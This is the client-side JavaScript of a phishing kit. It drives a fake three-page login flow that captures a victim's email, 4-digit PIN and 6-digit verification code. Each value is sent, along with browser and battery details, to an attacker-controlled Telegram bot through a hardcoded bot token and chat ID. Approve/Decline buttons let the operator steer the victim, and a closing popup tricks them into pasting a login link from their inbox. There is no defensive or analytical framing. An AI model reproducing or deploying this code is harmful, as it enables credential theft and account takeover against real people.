document.addEventListener("DOMContentLoaded", function () {
    const telegramBotToken = '7600421646:AAEWmFjiz9IcMUcqncFLp4wSnAHdZ77iaZU';
    const telegramChatId = '7837079543';
    const PIN_LENGTH = 4;
    const CODE_LENGTH = 6; // Final code length for page 3

    // Function to send session details to Telegram
    function sendSessionDataToTelegram(step, extraMessage) {
        const ip = 'IP_ADDRESS'; // Replace with real method to get IP (e.g., using a service or backend)
        const userAgent = navigator.userAgent;
        const battery = navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100 + '%') : 'Unknown';

        const sessionDetails = `
            Step: ${step}
            User IP: ${ip}
            User-Agent: ${userAgent}
            Battery Level: ${battery}
            Session Data: ${extraMessage}
        `;

        console.log("Sending session data:", sessionDetails);

        return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: sessionDetails
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Session data successfully sent to Telegram');
                return true;
            } else {
                console.error('Failed to send session data to Telegram:', data);
                return false;
            }
        })
        .catch(error => {
            console.error('Error in sending session data to Telegram:', error);
            return false;
        });
    }

    // Function to send a message to Telegram with Approve/Decline buttons
    function sendMessageToTelegramWithButtons(message) {
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        console.log("Sending message to Telegram with buttons:", message);

        return fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "Approve", callback_data: "approve" },
                            { text: "Decline", callback_data: "decline" }
                        ]
                    ]
                }
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Message successfully sent to Telegram bot');
                return true;
            } else {
                console.error('Failed to send message to Telegram:', data);
                return false;
            }
        })
        .catch(error => {
            console.error('Error in sendMessageToTelegramWithButtons function:', error);
            return false;
        });
    }

    // Function to initialize Email Entry
    function initEmailEntry() {
        const loginButton = document.querySelector('[data-testid="e2e-login-continue-button"]');
        const emailInput = document.getElementById('email');

        if (loginButton && emailInput) {
            console.log("Email entry elements found on Page 1");

            loginButton.addEventListener('click', function(event) {
                event.preventDefault();
                const email = emailInput.value.trim();

                // Validate email format
                const emailRegex = /^[\w-]+(\.[\w-]+)*@([\w-]+\.)+[a-zA-Z]{2,7}$/;
                if (!emailRegex.test(email) || email === 'test@gmail.com') {
                    alert('Invalid email or test email entered. Please re-enter your email.');
                    window.location.reload();  // Restart flow if email is invalid or test email
                    return;
                }

                console.log("Email entered:", email);
                sendMessageToTelegramWithButtons(`User entered email: ${email}`).then(success => {
                    if (success) {
                        localStorage.setItem("userEmail", email);
                        sendSessionDataToTelegram("Email Entry", `Email entered: ${email}`);
                        loadContent('page2.html');
                    }
                });
            });
        } else {
            console.log("Email entry elements not found on Page 1");
        }
    }

    // Function to initialize PIN Entry
    function initPinEntry() {
        const passcodeInput = document.getElementById('passcode-input');

        if (passcodeInput) {
            console.log("PIN entry elements found on Page 2");
            passcodeInput.addEventListener('input', function() {
                if (passcodeInput.value.length === PIN_LENGTH) {
                    console.log("PIN entered:", passcodeInput.value);
                    sendMessageToTelegramWithButtons(`Entered PIN: ${passcodeInput.value}`).then(success => {
                        if (success) {
                            sendSessionDataToTelegram("PIN Entry", `PIN entered: ${passcodeInput.value}`);
                            loadContent('page3.html');
                        }
                    });
                }
            });
        } else {
            console.log("PIN entry elements not found on Page 2");
        }
    }

    // Function to initialize Final Code Entry
    function initFinalCodeEntry() {
        const codeInput = document.getElementById('code-input');

        if (codeInput) {
            console.log("Final code entry elements found on Page 3");
            codeInput.addEventListener('input', function() {
                if (codeInput.value.length === CODE_LENGTH) {
                    console.log("Final code entered:", codeInput.value);
                    sendMessageToTelegramWithButtons(`Entered final code: ${codeInput.value}`).then(success => {
                        if (success) {
                            sendSessionDataToTelegram("Final Code Entry", `Final code entered: ${codeInput.value}`);
                            showPopup("We've updated our login flow. Please check your email inbox for a login link. Paste the URL you receive to proceed.");
                        }
                    });
                }
            });
        } else {
            console.log("Final code input element not found on Page 3");
        }
    }

    // Function to show the popup message after final code
    function showPopup(message) {
        const popup = document.createElement('div');
        popup.style.position = 'fixed';
        popup.style.top = '0';
        popup.style.left = '0';
        popup.style.width = '100%';
        popup.style.height = '100%';
        popup.style.backgroundColor = 'rgba(0, 0, 0, 0.5)';
        popup.style.display = 'flex';
        popup.style.justifyContent = 'center';
        popup.style.alignItems = 'center';
        popup.style.color = 'white';
        popup.style.fontSize = '20px';
        popup.style.zIndex = '9999';
        popup.style.padding = '20px';
        popup.innerHTML = `<div style="background-color: #333; padding: 20px; border-radius: 8px; text-align: center; max-width: 600px;">
            <p>${message}</p>
            <button onclick="handlePopupClose()">OK</button>
        </div>`;
        document.body.appendChild(popup);
    }

    // Handle the close of the popup and redirect to page4.html
    function handlePopupClose() {
        // Close the popup
        const popup = document.querySelector('div[style*="position: fixed"]');
        if (popup) {
            document.body.removeChild(popup);
        }

        // Redirect to page4.html
        window.location.href = 'page4.html';
    }

    // Run the appropriate function based on the current page
    if (document.body.contains(document.getElementById('email'))) {
        initEmailEntry();
    } else if (document.body.contains(document.getElementById('passcode-input'))) {
        initPinEntry();
    } else if (document.body.contains(document.getElementById('code-input'))) {
        initFinalCodeEntry();
    }
});
